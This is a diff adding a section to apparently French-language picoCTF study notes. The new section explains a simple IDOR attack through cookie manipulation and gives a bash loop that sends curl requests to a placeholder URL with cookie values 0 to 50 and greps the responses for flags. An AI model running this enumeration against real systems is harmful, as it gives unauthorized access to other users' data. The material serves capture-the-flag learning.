@@ -179,3 +179,18 @@ Souvent, les flags ou les sessions sont cachés derrière plusieurs couches d'en
 Une fois les caractères spéciaux nettoyés, on utilise le terminal :
 ```bash
 echo "cGljb...==" | base64 -d
+```
+
+## Manipulation de Cookies : IDOR Simple
+
+Lorsqu'un site utilise un cookie avec une valeur numérique simple (ex: `id=1`), il est possible de tester d'autres valeurs pour accéder à des données non autorisées.
+
+### Automatisation avec Curl
+Si une ressource change en fonction d'un cookie, on peut "brute-forcer" les valeurs :
+
+```bash
+# Boucle pour tester les valeurs de cookie de 0 à 50
+for i in {0..50}; do 
+    curl -s -b "cookie_name=$i" [URL] | grep "picoCTF"
+done
+```
